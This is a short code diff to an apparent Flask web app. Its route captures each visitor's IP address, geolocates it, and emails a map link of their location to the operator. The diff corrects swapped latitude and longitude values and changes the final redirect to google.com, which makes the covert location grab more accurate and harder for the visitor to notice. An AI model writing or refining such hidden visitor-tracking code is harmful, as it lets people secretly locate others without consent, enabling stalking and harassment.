@@ -19,10 +19,10 @@ def hello_world():
 def get_my_ip():
     response = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     data = get_info_by_ip(ip=response)
-    lon = data['Lat']
-    lat = data['Lon']
+    lon = data['Lon']
+    lat = data['Lat']
     # req_site = f'https://gps-coordinates.org/my-location.php?lat={lat}&lng={lon}'
-    req_site = f'https://gps-coordinates.org/my-location.php?lat={lon}&lng={lat}'
+    req_site = f'https://gps-coordinates.org/my-location.php?lat={lat}&lng={lon}'
     msg = MIMEMultipart('alternative')
 
     html = f"""
@@ -51,7 +51,7 @@ def get_my_ip():
         server.sendmail(msg['From'], msg['To'], msg.as_string())
         print("Email has been sent")
         server.quit()
-        return redirect('/')
+        return redirect("http://www.google.com")
 
     except Exception:
         return redirect('/')
